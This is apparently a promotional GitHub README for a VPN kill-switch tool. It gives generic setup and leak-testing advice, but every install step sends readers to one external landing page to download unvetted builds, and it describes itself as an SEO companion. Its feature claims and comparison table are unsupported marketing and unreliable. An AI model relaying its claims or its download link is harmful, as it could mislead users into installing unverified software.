# ⚡ vpn proxy kill switch

[![Download](https://img.shields.io/badge/Download-Get%20the%20build-blue?style=for-the-badge)](https://matildasum.github.io/vpn-proxy-kill-switch-landing/)
[![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20macOS%20%7C%20Linux-2ea44f?style=for-the-badge)](https://matildasum.github.io/vpn-proxy-kill-switch-landing/)
[![License](https://img.shields.io/badge/License-MIT-black?style=for-the-badge)](https://matildasum.github.io/vpn-proxy-kill-switch-landing/)

## About

**vpn proxy kill switch** is a VPN-focused setup guide and reference repo for running a VPN proxy with a **Kill Switch** that actually does its job: when the tunnel drops, traffic stops. No silent fallbacks, no accidental IP leaks.

This repo is the SEO/documentation companion for:  
https://github.com/matildasum/vpn-proxy-kill-switch-seo

Main landing/download page (all links point here):  
https://matildasum.github.io/vpn-proxy-kill-switch-landing/

## Features

- **Kill Switch** behavior explained and enforced (block traffic when VPN is down)
- **AES-256 encryption** notes and configuration expectations
- **No-Logs policy** checklist: what to verify and what to avoid
- **Global Servers** selection tips (latency-first, not marketing-first)
- **High speed** tuning pointers (protocol choice, MTU sanity, DNS handling)
- **Stable connection** guidance (reconnect rules, watchdog behavior)
- **Privacy and security focus**: leak checks (IP/DNS/WebRTC) and hard stops

## System Requirements

| Item | Minimum | Notes |
|---|---:|---|
| Windows | 10 / 11 (64-bit) | Admin rights required for network rules |
| macOS | 12+ | Works best with a modern firewall + VPN client |
| Linux | Ubuntu 20.04+ / similar | iptables/nftables based kill switch rules |
| RAM | 2 GB | 4 GB recommended if running extra tooling |
| Storage | 200 MB | More if you keep logs locally (you shouldn’t) |
| Internet | Broadband | Kill switch is only meaningful on a real connection |

## Installation

> All installers and entry points are linked from the landing page:  
> https://matildasum.github.io/vpn-proxy-kill-switch-landing/

### Windows
1. Open the landing page and download the Windows build.
2. Install and allow network permissions when prompted.
3. Enable **Kill Switch** in settings before the first connection.
4. Connect to a server, then test by disconnecting the VPN: traffic should stop.

### macOS
1. Open the landing page and download the macOS build.
2. Install the app and grant required network permissions.
3. Turn on **Kill Switch** and confirm it blocks traffic on disconnect.
4. Run an IP/DNS leak check after connecting.

### Linux
1. Open the landing page and download the Linux build.
2. Install via your package method (or run the provided binary if applicable).
3. Enable **Kill Switch** and confirm firewall rules are applied.
4. Verify behavior: stop the tunnel process; outbound traffic should be blocked.

## Comparison

| Option | Speed | AES-256 | No Logs | Kill Switch | Global Servers |
|---|---:|:---:|:---:|:---:|:---:|
| **vpn proxy kill switch** | High speed | ✅ | ✅ | ✅ | ✅ |
| Typical free VPN | Low–Medium | ❓ | ❌ | ❌ | ❌ |
| Basic proxy only | Medium | ❌ | ❓ | ❌ | ❌ |

## FAQ

**1) What does “kill switch” mean here?**  
If the VPN drops, the system blocks outbound traffic so your real IP doesn’t leak.

**2) Will this slow down my connection?**  
A good VPN proxy setup stays **high speed**; the kill switch itself isn’t the bottleneck. Server choice and protocol are.

**3) Does it keep logs?**  
The expectation is a **No-Logs policy** approach. Don’t enable verbose connection logs unless you need them for debugging.

**4) How do I confirm it’s working?**  
Connect, start a download/ping, then force-disconnect the VPN. If traffic continues, the kill switch isn’t enforced.

## Download

Get the current build and setup steps here:  
**https://matildasum.github.io/vpn-proxy-kill-switch-landing/**

## Final CTA

[![Download Now](https://img.shields.io/badge/Download%20Now-vpn%20proxy%20kill%20switch-blue?style=for-the-badge)](https://matildasum.github.io/vpn-proxy-kill-switch-landing/)
[![Open Landing Page](https://img.shields.io/badge/Open-Landing%20Page-2ea44f?style=for-the-badge)](https://matildasum.github.io/vpn-proxy-kill-switch-landing/)
[![Get Started](https://img.shields.io/badge/Get%20Started-Setup%20in%20minutes-black?style=for-the-badge)](https://matildasum.github.io/vpn-proxy-kill-switch-landing/)

*If your VPN ever drops, your traffic should drop with it.*